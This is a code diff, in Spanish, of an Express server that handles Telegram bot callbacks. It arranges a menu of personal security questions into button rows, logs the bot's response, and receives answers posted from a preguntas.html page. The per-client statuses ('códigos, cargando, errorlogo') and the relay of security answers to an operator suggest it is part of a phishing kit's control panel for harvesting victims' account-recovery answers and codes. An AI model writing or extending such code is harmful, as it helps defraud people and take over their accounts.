@@ -89,7 +89,7 @@ app.post('/callback', async (req, res) => {
 
   if (!cliente) return res.sendStatus(404);
 
-  // Submenú de preguntas
+  // 🔐 SUBMENÚ DE PREGUNTAS
   if (accion === 'preguntas_menu') {
     const preguntas = [
       "¿Cuál fue el nombre de mi primer novio(a)?",
@@ -110,13 +110,24 @@ app.post('/callback', async (req, res) => {
     ];
 
     const keyboardPreguntas = {
-      inline_keyboard: preguntas.map(p => [{
-        text: p,
-        callback_data: `select_question:${txid}:${encodeURIComponent(p)}`
-      }])
+      inline_keyboard: []
     };
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    // Agrupar en filas de 2 botones para evitar límite de Telegram
+    for (let i = 0; i < preguntas.length; i += 2) {
+      const fila = [];
+      for (let j = 0; j < 2; j++) {
+        if (preguntas[i + j]) {
+          fila.push({
+            text: preguntas[i + j],
+            callback_data: `select_question:${txid}:${encodeURIComponent(preguntas[i + j])}`
+          });
+        }
+      }
+      keyboardPreguntas.inline_keyboard.push(fila);
+    }
+
+    const respuesta = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -126,10 +137,13 @@ app.post('/callback', async (req, res) => {
       })
     });
 
+    const result = await respuesta.json();
+    console.log("🔁 Enviado submenú preguntas:", result);
+
     return res.sendStatus(200);
   }
 
-  // Selección de preguntas
+  // ✅ Selección de preguntas
   if (accion === 'select_question') {
     const pregunta = decodeURIComponent(partes[2]);
 
@@ -155,7 +169,7 @@ app.post('/callback', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // Otras acciones
+  // ⚙️ Otras acciones (códigos, cargando, errorlogo)
   cliente.status = accion;
   guardarEstado();
 
@@ -171,7 +185,7 @@ app.post('/callback', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Envío de respuestas a las preguntas
+// 📩 Recibe respuestas desde preguntas.html
 app.post('/enviar-preguntas', async (req, res) => {
   const { txid, respuestas } = req.body;
   const cliente = clientes[txid];
